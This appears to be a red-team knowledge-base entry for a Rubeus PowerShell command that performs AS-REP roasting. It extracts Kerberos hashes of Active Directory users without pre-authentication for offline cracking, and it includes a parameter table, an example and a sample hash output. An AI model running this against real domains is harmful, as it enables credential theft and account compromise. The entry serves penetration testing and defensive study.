---
type: command
executor: powershell
data: Get-ASREPHash -Domain $_DOMAIN -UserName $_TARGET_USER
output: null
platforms:
  - Windows
tags:
  - active-directory
  - as-rep-roasting
verified: true
validated: true
---

# rubeus-get-asrephash

## Command

```powershell
Get-ASREPHash -Domain $_DOMAIN -UserName $_TARGET_USER
```

## Description

Uses Rubeus to request and extract an AS-REP hash from a target user when pre-authentication is disabled, for offline cracking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Domain | Target domain name | Yes |
| -UserName | Target username | Yes |
| $_DOMAIN | Domain (e.g., domain.local) | Yes |
| $_TARGET_USER | Username | Yes |

## Examples

### Basic Usage

```powershell
Get-ASREPHash -Domain domain.local -UserName targetuser
```

## Expected Output

[AS-REP Pre-Auth] User: targetuser, Hash: $krb5asrep$23$targetuser@DOMAIN:guid:hash

## Related

- [[procedures/Active-Directory-ACL-Abuse-via-Kerberoasting-and-AS-REP-Roasting]]
- [[tools/Rubeus]]
